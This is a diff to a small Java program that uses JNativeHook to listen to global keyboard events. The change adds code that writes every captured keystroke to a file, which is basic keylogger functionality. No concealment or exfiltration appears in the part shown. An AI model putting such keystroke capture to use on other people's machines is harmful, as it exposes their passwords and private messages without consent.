@@ -13,6 +13,7 @@ import org.jnativehook.keyboard.NativeKeyListener;
  * 
  */
 import static my.file.myTXT.createFile;
+import static my.file.myTXT.writeFile;
 
 public class Main implements NativeKeyListener {
 
@@ -39,6 +40,12 @@ public class Main implements NativeKeyListener {
         String keyString = nativeEvent.getKeyText(keyCode);
         System.out.println("Tecla pulsada (Código VK): " + keyCode);
         System.out.println("Letra: "+keyString);
+        
+        try {
+            writeFile(keyString);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     @Override
